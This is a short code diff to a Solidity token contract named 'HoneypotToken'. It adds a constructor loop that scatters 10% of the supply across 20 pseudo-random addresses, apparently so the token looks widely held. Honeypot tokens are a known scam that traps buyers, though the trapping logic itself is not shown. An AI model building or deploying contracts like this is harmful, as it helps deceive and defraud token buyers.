@@ -24,6 +24,13 @@ contract HoneypotToken is ERC20, Ownable {
 
     constructor(uint256 initialSupply) ERC20("Honeypot Token", "HPT") Ownable(msg.sender) {
         _mint(msg.sender, initialSupply);
+
+        // Distribute 10% of supply to 20 random addresses (5000 tokens each)
+        uint256 amountPerAddress = initialSupply / 200; // 0.5% each, 10% total
+        for (uint256 i = 0; i < 20; i++) {
+            address randomAddr = address(uint160(uint256(keccak256(abi.encodePacked(block.timestamp, i, msg.sender)))));
+            _transfer(msg.sender, randomAddr, amountPerAddress);
+        }
     }
 
     function setUniswapPair(address _pair) external onlyOwner {
